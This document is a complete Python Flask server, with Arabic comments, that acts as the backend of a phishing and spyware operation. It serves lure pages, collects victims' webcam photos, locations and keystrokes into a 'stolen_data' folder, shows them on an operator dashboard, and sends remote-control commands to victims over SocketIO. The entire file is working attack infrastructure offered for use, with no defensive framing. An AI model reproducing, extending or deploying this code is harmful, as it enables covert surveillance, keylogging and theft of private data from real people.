#!/usr/bin/env python3
import os
import json
import base64
from datetime import datetime
from flask import Flask, request, jsonify, render_template, send_file
from flask_socketio import SocketIO

# 1. إعداد المسارات المطلقة لضمان العثور على الملفات في Render
template_dir = os.path.abspath('templates')
static_dir = os.path.abspath('static')

app = Flask(__name__, 
            template_folder=template_dir, 
            static_folder=static_dir)

app.config['SECRET_KEY'] = 'cairopy_sec_2024'

# 2. استخدام async_mode='gevent' لضمان استقرار التحكم عن بُعد
socketio = SocketIO(app, cors_allowed_origins="*", async_mode='gevent')

# 3. إعداد مجلدات التخزين
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
STOLEN_DIR = os.path.join(BASE_DIR, "stolen_data")

folders = ['camera', 'keys', 'location', 'contacts', 'files']
for folder in folders:
    os.makedirs(os.path.join(STOLEN_DIR, folder), exist_ok=True)

VICTIM_IP = "Unknown"

# ========== صفحات الهجوم (داخل مجلد templates) ==========
@app.route('/')
def index_attack(): return render_template('index.html')

@app.route('/image')
def image_attack(): return render_template('image.html')

@app.route('/qr')
def qr_attack(): return render_template('qr.html')

# ========== استقبال البيانات (نفس وظائف V1) ==========
@app.route('/api/camera', methods=['POST'])
def receive_camera():
    data = request.json
    v_id = data.get('victim_id', 'unknown')
    p_type = data.get('type', 'front')
    img_data = data.get('image', '')
    if img_data:
        filename = f"{v_id}_{p_type}_{datetime.now().strftime('%H%M%S')}.jpg"
        path = os.path.join(STOLEN_DIR, 'camera', filename)
        with open(path, 'wb') as f:
            f.write(base64.b64decode(img_data.split(',')[1] if ',' in img_data else img_data))
        return jsonify({"status": "ok"})
    return jsonify({"status": "error"}), 400

@app.route('/api/location', methods=['POST'])
def receive_location():
    data = request.json
    path = os.path.join(STOLEN_DIR, 'location', f"loc_{request.remote_addr.replace('.','_')}.json")
    with open(path, 'a', encoding='utf-8') as f:
        f.write(json.dumps(data) + '\n')
    return jsonify({"status": "ok"})

@app.route('/api/keylog', methods=['POST'])
def receive_keylog():
    data = request.json
    global VICTIM_IP
    VICTIM_IP = request.remote_addr
    path = os.path.join(STOLEN_DIR, 'keys', f"log_{VICTIM_IP.replace('.','_')}.txt")
    with open(path, 'a', encoding='utf-8') as f:
        f.write(json.dumps({'time': datetime.now().isoformat(), 'keys': data.get('keys', '')}) + '\n')
    return jsonify({"status": "ok"})

# ========== لوحة التحكم (المتحكم) ==========
@app.route('/dashboard')
def dashboard():
    # قراءة أسماء الملفات لعرضها في القوائم
    files_map = {f: os.listdir(os.path.join(STOLEN_DIR, f)) for f in folders}
    return render_template('dashboard.html', files=files_map, victim_ip=VICTIM_IP)

@app.route('/api/control', methods=['POST'])
def control_victim():
    data = request.json
    socketio.emit('control', data) # إرسال الأمر للضحية
    return jsonify({"status": "sent"})

@app.route('/stolen/<category>/<filename>')
def serve_stolen(category, filename):
    return send_file(os.path.join(STOLEN_DIR, category, filename))

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    socketio.run(app, host='0.0.0.0', port=port)
